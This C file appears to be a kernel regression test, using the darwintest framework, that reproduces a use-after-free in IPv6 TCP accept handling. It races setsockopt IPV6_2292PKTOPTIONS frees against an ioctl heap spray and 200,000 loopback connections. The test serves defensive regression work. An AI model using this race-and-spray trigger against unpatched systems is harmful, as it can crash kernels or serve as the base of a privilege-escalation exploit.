#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <arpa/inet.h>
#include <fcntl.h>
#include <pthread.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include <darwintest.h>

/* sizeof(struct ip6_pktopts) */
#define SIZEOF_STRUCT_IP6_PKTOPTS 192

static int finished = 0;

static void *
setopt_thread(void *data)
{
	int s = *(int *)data;
	uint8_t optbuf[CMSG_LEN(0)];
	uint8_t spraybuf[SIZEOF_STRUCT_IP6_PKTOPTS];

	memset(optbuf, 0, sizeof(optbuf));
	memset(spraybuf, 0x41, sizeof(spraybuf));

	while (!finished) {
		T_ASSERT_POSIX_SUCCESS(setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, optbuf, sizeof(optbuf)), NULL);

		/* force an error to free: */
		T_ASSERT_EQ(setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, optbuf, 1), -1, NULL);

		/* realloc: */
		T_ASSERT_EQ(ioctl(-1, _IOW('x', 0, spraybuf), spraybuf), -1, NULL);
	}

	return NULL;
}

static void *
connect_thread(void *data)
{
	struct sockaddr_in6 *dst = data;
	int s;

	while (!finished) {
		T_ASSERT_POSIX_SUCCESS(s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP), NULL);
		connect(s, (const struct sockaddr *)dst, sizeof(*dst));
		close(s);
	}

	return NULL;
}

T_DECL(tcp_input_outputopts_uaf_56155583, "Use-after-free when accepting TCP6 connections.")
{
	int s;
	struct sockaddr_in6 sin6 = {
		.sin6_family = AF_INET6,
		.sin6_port = htons(1337)
	};
	struct sockaddr_in6 addr;
	socklen_t addr_len;
	pthread_t threads[20];
	int nthreads = 0;
	int n;

	T_SETUPBEGIN;
	T_ASSERT_EQ(inet_pton(AF_INET6, "::1", &sin6.sin6_addr), 1, NULL);
	T_ASSERT_POSIX_SUCCESS(s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP), NULL);
	T_ASSERT_POSIX_SUCCESS(bind(s, (const struct sockaddr *)&sin6, sizeof(sin6)), NULL);
	T_ASSERT_POSIX_SUCCESS(listen(s, 32), NULL);
	T_ASSERT_POSIX_SUCCESS(fcntl(s, F_SETFL, fcntl(s, F_GETFL) | O_NONBLOCK), NULL);
	T_SETUPEND;

	for (n = 0; n < 16; ++n) {
		if (pthread_create(&threads[nthreads++], NULL, setopt_thread, &s)) {
			T_ASSERT_FAIL("pthread_create failed");
		}
	}

	for (n = 0; n < 4; ++n) {
		if (pthread_create(&threads[nthreads++], NULL, connect_thread, &sin6)) {
			T_ASSERT_FAIL("pthread_create failed");
		}
	}

	for (n = 0; n < 200000; ++n) {
		addr_len = sizeof(addr);
		close(accept(s, (struct sockaddr *)&addr, &addr_len));
	}

	finished = 1;

	for (n = 0; n < nthreads; ++n) {
		pthread_join(threads[n], NULL);
	}
}
